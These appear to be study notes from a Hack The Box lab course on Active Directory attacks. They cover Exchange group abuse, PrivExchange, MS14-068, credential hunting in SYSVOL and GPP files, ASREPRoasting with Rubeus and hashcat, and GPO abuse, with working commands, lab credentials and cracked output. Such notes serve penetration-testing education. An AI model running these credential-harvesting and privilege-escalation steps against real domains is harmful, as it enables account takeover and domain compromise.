
## Exchange Related Group Membership
The group `Exchange Windows Permissions` is not listed as a protected group, but members are granted the ability to write a DACL to the domain object. This can be leveraged to give a user DCSync privileges. An attacker can add accounts to this group by leveraging a DACL misconfiguration (possible) or by leveraging a compromised account that is a member of the Account Operators group. It is common to find user accounts and even computers as members of this group. Power users and support staff in remote offices are often added to this group, allowing them to reset passwords. This [GitHub repo](https://github.com/gdedrouas/Exchange-AD-Privesc) details a few techniques for leveraging Exchange for escalating privileges in an AD environment.

Exchange group `Organization Management` > powerful group (effectively the "Domain Admins" of Exchange) and can access the mailboxes of all domain users. It is not uncommon for sysadmins to be members of this group. This group also has full control of the OU called `Microsoft Exchange Security Groups`, which contains the group `Exchange Windows Permissions`.

If we can compromise an Exchange server, this will often lead to Domain Admin privileges. Additionally, dumping credentials in memory from an Exchange server will produce 10s if not 100s of cleartext credentials or NTLM hashes. This is often due to users logging in to Outlook Web Access (OWA) and Exchange caching their credentials in memory after a successful login.


## PrivExchange

The `PrivExchange` attack results from a flaw in the Exchange Server `PushSubscription` feature, which allows any domain user with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP.

The Exchange service runs as SYSTEM and is over-privileged by default (i.e., has WriteDacl privileges on the domain pre-2019 Cumulative Update). This flaw can be leveraged to relay to LDAP and dump the domain NTDS database. If we cannot relay to LDAP, this can be leveraged to relay and authenticate to other hosts within the domain. This attack will take you directly to Domain Admin with any authenticated domain user account.

## Printer Bug
#### Enumerating for MS-PRN Printer Bug
https://academy.hackthebox.com/module/143/section/1276
```powershell-session
PS C:\htb> Import-Module .\SecurityAssessment.ps1
PS C:\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

ComputerName                        Status
------------                        ------
ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True
```



## MS14-068
A Kerberos ticket contains information about a user, including the account name, ID, and group membership in the Privilege Attribute Certificate (PAC). The PAC is signed by the KDC using secret keys to validate that the PAC has not been tampered with after creation.

The vulnerability allowed a forged PAC to be accepted by the KDC as legitimate. This can be leveraged to create a fake PAC, presenting a user as a member of the Domain Administrators or other privileged group. It can be exploited with tools such as the [Python Kerberos Exploitation Kit (PyKEK)](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) or the Impacket toolkit. The only defense against this attack is patching


## Sniffing LDAP Credentials
Many applications and printers store LDAP credentials in their web admin console to connect to the domain. These consoles are often left with weak or default passwords. Sometimes, these credentials can be viewed in cleartext. Other times, the application has a `test connection` function that we can use to gather credentials by changing the LDAP IP address to that of our attack host and setting up a `netcat` listener on LDAP port 389. When the device attempts to test the LDAP connection, it will send the credentials to our machine, often in cleartext. Accounts used for LDAP connections are often privileged, but if not, this could serve as an initial foothold in the domain. Other times, a full LDAP server is required to pull off this attack, as detailed in this [post](https://grimhacker.com/2018/03/09/just-a-printer/).


------
-----
## Enumerating DNS Records
We can use a tool such as [adidnsdump](https://github.com/dirkjanm/adidnsdump) to enumerate all DNS records in a domain using a valid domain user account. This is especially helpful if the naming convention for hosts returned to us in our enumeration using tools such as `BloodHound` is similar to `SRV01934.INLANEFREIGHT.LOCAL`. If all servers and workstations have a non-descriptive name, it makes it difficult for us to know what exactly to attack. If we can access DNS entries in AD, we can potentially discover interesting DNS records that point to this same server, such as `JENKINS.INLANEFREIGHT.LOCAL`, which we can use to better plan out our attacks.


by default, all users can list the child objects of a DNS zone in an AD environment. By default, querying DNS records using LDAP does not return all results. So by using the `adidnsdump` tool, we can resolve all records in the zone and potentially find something useful for our engagement. The background and more in-depth explanation of this tool and technique can be found in this [post](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/).

#### Using adidnsdump
```shell-session
AhmaDb0x@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 
```

#### Viewing the Contents of the records.csv File
```shell-session
AhmaDb0x@htb[/htb]$ head records.csv 
```

#### Using the -r Option to Resolve Unknown Records
```shell-session
AhmaDb0x@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```

---

## Other Misconfigurations
### Password in Description Field
Sensitive information such as account passwords are sometimes found in the user account `Description` or `Notes` fields and can be quickly enumerated using PowerView. For large domains, it is helpful to export this data to a CSV file to review offline.


#### Finding Passwords in the Description Field using Get-Domain User

```powershell-session
PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}

samaccountname description
-------------- -----------
administrator  Built-in account for administering the computer/domain
guest          Built-in account for guest access to the computer/domain
krbtgt         Key Distribution Center Service Account
ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
```

## PASSWD_NOTREQD Field
`userAccountControl attribute`

There are many reasons why this flag may be set on a user account, one being that a vendor product set this flag on certain accounts at the time of installation and never removed the flag post-install. It is worth enumerating accounts with this flag set and testing each to see if no password is required (I have seen this a couple of times on assessments)

include it in the client report if the goal of the assessment is to be as comprehensive as possible


#### Checking for PASSWD_NOTREQD Setting using Get-DomainUser
```powershell-session
PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

samaccountname                                                         useraccountcontrol
--------------                                                         ------------------
guest                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
$725000-9jb50uejje9f                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
nagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT
```


## Credentials in SMB Shares and SYSVOL Scripts
### **What Are SYSVOL Scripts in an AD Network?**

SYSVOL (System Volume) is a shared folder on domain controllers (DCs) in an Active Directory (AD) network that stores important domain-wide files, including:

- **Group Policy Objects (GPOs)**
- **Logon/logoff scripts**
- **Startup/shutdown scripts**

SYSVOL is replicated among all domain controllers using the **Distributed File System Replication (DFSR)** service in modern Windows versions

- ocated at: `C:\Windows\SYSVOL\domain\scripts\`
- Often used for **automated tasks** like mapping drives, running batch files, or applying security configurations via logon scripts.
- Accessible by **all authenticated users** in the domain, making it an interesting attack vector.

```shell
Get-ChildItem -Path \\domain.local\SYSVOL -Recurse -File | Select-String -Pattern "password|pass|pwd"

```

```shell 
dir /s /b \\domain.local\SYSVOL\  
```

We may find many different batch, VBScript, and PowerShell scripts within the scripts directory, which is readable by all authenticated users in the domain. It is worth digging around this directory to hunt for passwords stored in scripts. Sometimes we will find very old scripts containing since disabled accounts or old passwords, but from time to time, we will strike gold, so we should always dig through this directory. Here, we can see an interesting script named `reset_local_admin_pass.vbs`.

```shell
PS C:\htb> ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts

    Directory: \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts


Mode                LastWriteTime         Length Name                                                                 
----                -------------         ------ ----                                                                 
-a----       11/18/2021  10:44 AM            174 daily-runs.zip                                                       
-a----        2/28/2022   9:11 PM            203 disable-nbtns.ps1                                                    
-a----         3/7/2022   9:41 AM         144138 Logon Banner.htm                                                     
-a----         3/8/2022   2:56 PM            979 reset_local_admin_pass.vbs  
```

CrackMapExec and the `--local-auth` flag as shown in this module's `Internal Password Spraying - from Linux`

```shell
PS C:\htb> cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs

On Error Resume Next
strComputer = "."
 
Set oShell = CreateObject("WScript.Shell") 
sUser = "Administrator"
sPwd = "!ILFREIGHT_L0cALADmin!"
 
Set Arg = WScript.Arguments
If  Arg.Count > 0 Then
sPwd = Arg(0) 'Pass the password as parameter to the script
End if
 
'Get the administrator name
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
```

## Group Policy Preferences (GPP) Passwords
When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:

- Map drives (drives.xml)
- Create local users
- Create printer config files (printers.xml)
- Creating and updating services (services.xml)
- Creating scheduled tasks (scheduledtasks.xml)
- Changing local admin passwords.

The `cpassword` attribute value is AES-256 bit encrypted, but Microsoft [published the AES private key on MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN), which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.


If you retrieve the cpassword value more manually, the `gpp-decrypt` utility can be used to decrypt the password as follows:

```bash
AhmaDb0x@htb[/htb]$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

Password1
```



GPP passwords can be located by searching or manually browsing the SYSVOL share or using tools such as [Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1), the GPP Metasploit Post Module, and other Python/Ruby scripts which will locate the GPP and return the decrypted cpassword value. CrackMapExec also has two modules for locating and retrieving GPP passwords. One quick tip to consider during engagements: Often, GPP passwords are defined for legacy accounts, and you may therefore retrieve and decrypt the password for a locked or deleted account. However, it is worth attempting to password spray internally with this password (especially if it is unique). Password re-use is widespread, and the GPP password combined with password spraying could result in further access.


#### Locating & Retrieving GPP Passwords with CrackMapExec
```shell-session
AhmaDb0x@htb[/htb]$ crackmapexec smb -L | grep gpp
```
#### Using CrackMapExec's gpp_autologin Module
```shell-session
AhmaDb0x@htb[/htb]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```
```shell-session
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']
```
 find passwords in files such as Registry.xml when autologon is configured via Group Policy

---

## ASREPRoasting
AS-REP message abuse
obtain the Ticket Granting Ticket (TGT) for any account that has the `[Do not require Kerberos pre-authentication]` setting enabled

The authentication service reply (AS_REP) is encrypted with the account’s password, and any domain user can request it.


ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP

- **AS-REP message**, which contains:
    - **A session key** (encrypted with the user’s NTLM hash).
    - **The TGT** (encrypted with the `krbtgt` hash).
- The attacker can capture this **AS-REP response** because it's **encrypted using only the user’s NTLM hash**, making it crackable **offline**.

---
The attack itself can be performed with the [Rubeus](https://github.com/GhostPack/Rubeus) toolkit and other tools to obtain the ticket for the target account. If an attacker has `GenericWrite` or `GenericAll` permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling the attribute again. Like Kerberoasting, the success of this attack depends on the account having a relatively weak password

---

#### Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser
```shell
PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth

Remember, add the `/nowrap` flag so the ticket is not column wrapped and is retrieved in a format that we can readily feed into Hashcat.

#### Retrieving AS-REP in Proper Format using Rubeus
```shell
PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: AS-REP roasting
```

```powershell-session
  $krb5asrep$
```
#### Cracking the Hash Offline with Hashcat
 ```shell
AhmaDb0x@htb[/htb]$ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt 
```
#### Retrieving the AS-REP Using Kerbrute
```shell
AhmaDb0x@htb[/htb]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```

#### Hunting for Users with Kerberoast Pre-auth Not Required
```shell
AhmaDb0x@htb[/htb]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 

┌──(pwn㉿kali)-[~]
└─$ GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request   

$krb5asrep$23$svc-alfresco@HTB.LOCAL
```
`hashcat` to crack <> 18200

we do not need to be on a domain-joined host to a) enumerate accounts that do not require Kerberos pre-authentication and b) perform this attack and obtain an AS-REP to crack offline to either gain a foothold in the domain or further our access.


---

## Group Policy Object (GPO) Abuse
### **GPO Storage Locations:**

1. **Active Directory** – Stores GPO settings in domain controllers (DCs).
2. **SYSVOL Share** (`\\domain.local\SYSVOL\...`) – Stores GPO scripts, policies, and files.


- GPOs can be linked to **Organizational Units (OUs)**, **Sites**, or the **entire Domain**.
- The settings inside a GPO affect **users or computers** based on how it's configured.

**GPO is an actual object** that exists in the directory, just like users and computers.

**Example:** When you create a new GPO, AD generates an object with a unique ID like:  
`{6AC1786C-016F-11D2-945F-00C04FB984F9}`  
This object is then linked to an **OU, domain, or site** and applies settings to computers or users inside that scope.


If we can gain rights over a Group Policy Object via an ACL misconfiguration, we could leverage this for lateral movement, privilege escalation, and even domain compromise and as a persistence mechanism within the domain.


---
GPO misconfigurations can be abused to perform the following attacks:

- Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)
- Adding a local admin user to one or more hosts
- Creating an immediate scheduled task to perform any number of actions
#### Enumerating GPO Names with PowerView
```shell
PS C:\htb> Get-DomainGPO |select displayname
```

denying cmd.exe access and a separate password policy for service accounts). We can see that autologon is in use which may mean there is a readable password in a GPO

>`autologon is in use` == `readable password in a GPO`

If Group Policy Management Tools are installed on the host we are working from?
`we can use various built-in [GroupPolicy cmdlets](https://docs.microsoft.com/en-us/powershell/module/grouppolicy/?view=windowsserver2022-ps) such as `Get-GPO` to perform the same enumeration.

#### Enumerating GPO Names with a Built-In Cmdlet
`
```powershell-session
PS C:\htb> Get-GPO -All | Select DisplayName
```

#### Enumerating Domain User GPO Rights
```powershell-session
PS C:\htb> $sid=Convert-NameToSid "Domain Users"
PS C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```
```shell
ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532}
```
permissions over a GPO, such as `WriteProperty` and `WriteDacl`, which we could leverage to give ourselves full control over the GPO and pull off any number of attacks that would be pushed down to any users and computers in OUs that the GPO is applied to. We can use the GPO GUID combined with `Get-GPO` to see the display name of the GPO.

#### Converting GPO GUID to Name
```powershell-session
PS C:\htb Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532

DisplayName      : Disconnect Idle RDP
DomainName       : INLANEFREIGHT.LOCAL
Owner            : INLANEFREIGHT\Domain Admins
Id               : 7ca9c789-14ce-46e3-a722-83f4097af532
GpoStatus        : AllSettingsEnabled
```

Checking in BloodHound, we can see that the `Domain Users` group has several rights over the `Disconnect Idle RDP` GPO, which could be leveraged for full control of the object.

![image](https://academy.hackthebox.com/storage/modules/143/gporights.png)


![image](https://academy.hackthebox.com/storage/modules/143/gpoaffected.png)
[SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) > 
to take advantage of this GPO misconfiguration by performing actions such as adding a user that we control to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give us a reverse shell, or configure a malicious computer startup script to provide us with a reverse shell or similar. When using a tool like this, we need to be careful because commands can be run that affect every computer within the OU that the GPO is linked to. If we found an editable GPO that applies to an OU with 1,000 computers, we would not want to make the mistake of adding ourselves as a local admin to that many hosts. Some of the attack options available with this tool allow us to specify a target user or host

----
- ctive Directory Certificate Services (AD CS) attacks
- Kerberos Constrained Delegation
- Kerberos Unconstrained Delegation
- Kerberos Resource-Based Constrained Delegation (RBCD)

---



